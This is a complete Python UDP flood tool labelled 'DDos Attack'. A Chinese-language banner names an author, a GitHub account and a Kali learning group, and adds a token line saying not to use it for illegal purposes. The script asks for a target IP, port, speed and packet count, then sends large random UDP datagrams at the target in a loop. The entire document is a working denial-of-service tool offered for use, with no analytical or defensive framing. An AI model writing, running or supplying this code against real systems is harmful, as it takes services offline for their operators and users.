import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print (" ")
print ("/---------------------------------------------------\ ")
print ("|   作者          : 放空                       |")
print ("|   作者github    : https://github.com/FKNB666    |")
print ("|   kali-QQ学习群 : 1041839393                       |")
print ("|   版本          : V1.1.0                          |")
print ("|   严禁转载，程序教程仅发布在放空交流群（用户放空）   |")
print ("\---------------------------------------------------/")
print (" ")
print (" -----------------[请勿用于违法用途]----------------- ")
print (" ")
ip = input("请输入 IP     : ")
port = int(input("攻击端口      : "))
sd = int(input("攻击速度(1~1000) : "))
cs = int(input("攻击次数 : "))
os.system("clear")
fk = 0
sent = 0
while fk < cs:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     fk = fk + 1
     print ("已发送 %s 个数据包到 %s 端口 %d"%(sent,ip,port))
     time.sleep((1000-sd)/2000)